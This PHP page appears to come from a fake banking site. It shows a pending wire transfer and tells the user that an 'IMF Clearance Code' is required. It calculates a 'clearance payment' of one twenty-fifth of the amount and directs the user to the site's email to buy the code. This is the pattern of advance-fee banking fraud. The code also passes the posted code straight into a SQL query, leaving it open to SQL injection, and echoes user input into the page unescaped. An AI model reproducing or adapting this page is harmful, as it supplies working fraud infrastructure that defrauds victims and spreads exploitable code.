<?php
session_start();
require('../library/config2.php');
?>


<?php 

if (isset($_POST['rbname'])) { 
    $_SESSION['rbname'] = $_POST['rbname'];
}

if (isset($_POST['accno'])) { 
    $_SESSION['accno'] = $_POST['accno'];
}

if (isset($_POST['bname'])) { 
    $_SESSION['bname'] = $_POST['bname'];
}

if (isset($_POST['bemailadd'])) { 
    $_SESSION['bemailadd'] = $_POST['bemailadd'];
}


if (isset($_POST['swift'])) { 
    $_SESSION['swift'] = $_POST['swift'];
}

if (isset($_POST['rcountry'])) { 
    $_SESSION['rcountry'] = $_POST['rcountry'];
}

if (isset($_POST['rstate'])) { 
    $_SESSION['rstate'] = $_POST['rstate'];
}

if (isset($_POST['amt'])) { 
    $_SESSION['amt'] = $_POST['amt'];
}
if (isset($_POST['saccno'])) { 
    $_SESSION['saccno'] = $_POST['saccno'];
}

if (isset($_POST['dot'])) { 
    $_SESSION['dot'] = $_POST['dot'];
}


if (isset($_POST['desc'])) { 
    $_SESSION['desc'] = $_POST['desc'];
}

if (isset($_POST['toption'])) { 
    $_SESSION['toption'] = $_POST['toption'];
}
?> 
 
 <script src='https://kit.fontawesome.com/a076d05399.js'></script>
					 
								
						 
               
   
	   <ul class="body-tabs body-tabs-layout tabs-animated body-tabs-animated nav">
                             
                                <a role="tab" class="nav-link active" id="tab-0" data-toggle="tab" href="#tab-content-0">
                                    <span><i class='fas fa-square-root-alt' style='font-size:24px;color:orange'></i> International Monetary Fund (IMF)</span>
                                </a>
                            </li> 
                        </ul>                   
	                      
	                      <div class="tab-content">
	                           <div class="form-desc" style="color:#05194B; text-align:justify;">
                             Dear <strong style="color:brown;"><?php echo $_SESSION['hlbank_user_name'];  ?></strong>, Our Banking Transfer Services are guided by laws of United States
                           FDIC and International Monetary Funds, to ensure your funds are free from money lanudering, you are require to obtian a Valid IMF Clearance Code from our wire
                           transfer Unit of <?php echo $site_title; ?>.
                           </p>
                           
                           Your are Transfering <strong style="color:brown;"><?php echo $_SESSION['hlbank_user']['currency'] ?> <?php  echo $_SESSION['amt'] ; ?>.00</strong>
                           from your <strong style="color:brown;"><?php  echo $_SESSION['saccno'] ; ?></strong>
                        to <strong style="color:brown;"><?php  echo $_SESSION['rbname'] ; ?></strong> to 
                        <strong style="color:brown;"><?php  echo $_SESSION['bname'] ; ?></strong> a citizen of 
                        <strong style="color:brown;"><?php  echo $_SESSION['rstate'] ; ?>, <?php  echo $_SESSION['rcountry'] ; ?></strong>
                                
                                
                            </div>
                                <br>

                            <div class="tab-pane tabs-animation fade show active" id="tab-content-0" role="tabpanel">
                                <div class="main-card mb-3 card">
                                    <div class="card-body"> 
                                        
                                        
                                        
                                        
             
             <p>Bank Name: <?php  echo $_SESSION['rbname'] ; ?></p>
            <p>Bank Location: <?php  echo $_SESSION['rstate'] ; ?>, <?php  echo $_SESSION['rcountry'] ; ?></p>
            <p>Siwft Code/IBAN: <?php  echo $_SESSION['swift'] ; ?></p>
            <p>Bank Account: <?php  echo $_SESSION['accno'] ; ?></p>
                        
             <p>Your Calculated IMF Clearance Payment is : <strong style="color:brown;"><?php echo $_SESSION['hlbank_user']['currency'] ?> 
             <?php  echo $_SESSION['amt'] /25 ; ?>.00</strong> </p>
                   
                   <label>Contact Customer services via <a class="btn btn-primary" href="mailto:<?php echo $site_email; ?>"><?php echo $site_email; ?></a>
                          for your IMF Clearance Code</label>
                          
                          
                      <form action="#" method="POST" enctype="multipart/form-data" />
                            
                     <?php	
                    	#check for customer TAX code // M1l4n0 Best Banking system
                    	if(isset($_POST['submit'])){
                    		
                    		#$user=$_POST['userid'];
                    		$imf=$_POST['imf'];
                    		#echo '<h1>'.$pin.'</h1>';
                    		
                    		$sql = mysqli_query($conn,"SELECT `imf` FROM `tbl_users` WHERE `imf`=$imf LIMIT 1");
                    		
                    		if(mysqli_num_rows($sql)>0){
                    			
                    			 #$_SESSION['user'] = $user;
                    			 $_SESSION['user_id'] = $imf;
                    			 
                    			echo '<meta content="3; url=?v=atc"       http-equiv="refresh" />';
                    			echo '<h4 style="
                    			
                    			       color:white;
                            		padding: 10px;
                                      background-color: green; 
                                      width: 66%;
                                      height:40px;
                                      border-radius:10px;
                                      font-size:16px;
                                      font-weight:700;
                    			
                    			
                    			
                    			">Your Have Successfully Entered a Valid IMF Clearance Code Number  Wait a moment for Verification......</h4>';
                    			  
                    			  
                    			}else{
                    		            echo '<h4 style="
                    		            
                    		            color:white;
                            		padding: 10px;
                                      background-color: brown; 
                                      width: 50%;
                                      height:40px;
                                      border-radius:6px;
                                      font-size:16px;
                                      font-weight:700;
                    		            
                    		            ">  Invalid IMF Clearance Code Number, Contact Your Account Officer</h4>';
                    			   
                    		   }
                    	   }
                    
                    ?>  
                       
                          
                          
                            <div class="position-relative form-group"><label for="exampleAddress" class="">IMF Clearance Code</label>
                            <input name="imf"  style="height:80px;"  type="text" class="form-control" required=""></div>
                            
                            
                            
                            
<input type="hidden" name="rbname" value="<?php   echo $_SESSION['rbname']  ; ?> "/>
 <input type="hidden" name="accno" value="<?php  echo $_SESSION['accno'] ; ?> "/>
 <input type="hidden" name="bname" value="<?php  echo $_SESSION['bname'] ; ?> "/>
 <input type="hidden" name="rcountry" value="<?php echo $_SESSION["rcountry"]; ?> "/>
 <input type="hidden" name="rstate" value="<?php echo $_SESSION["rstate"]; ?> "/>
<input type="hidden" name="bemailadd" value="<?php echo $_SESSION["bemailadd"]; ?> "/>
<input type="hidden" name="swift" value="<?php echo $_SESSION["swift"]; ?> "/>
<input type="hidden" name="dot" value="<?php echo $_SESSION["dot"]; ?> "/>
<input type="hidden" name="amt" value="<?php echo $_SESSION["amt"]; ?> "/>
<input type="hidden" name="toption" value="<?php echo $_SESSION["toption"]; ?> "/>
<input type="hidden" name="desc" value="<?php echo $_SESSION["desc"]; ?> "/>
<input type="hidden" name="saccno" value="<?php echo $_SESSION["saccno"]; ?> "/>
                                            
                                            <button  id="submitButton" type="submit" name="submit" class="mt-2 btn btn-primary">
                                                <i class='fas fa-square-root-alt' style='font-size:24px;color:orange'></i>&nbsp;
                                                Validate IMF Clearance Code ></button>
                                        </form>
                                    </div>
                                </div>
                                
                            </div>
                            
                        </div>
 
   
   
   
                            
    
                         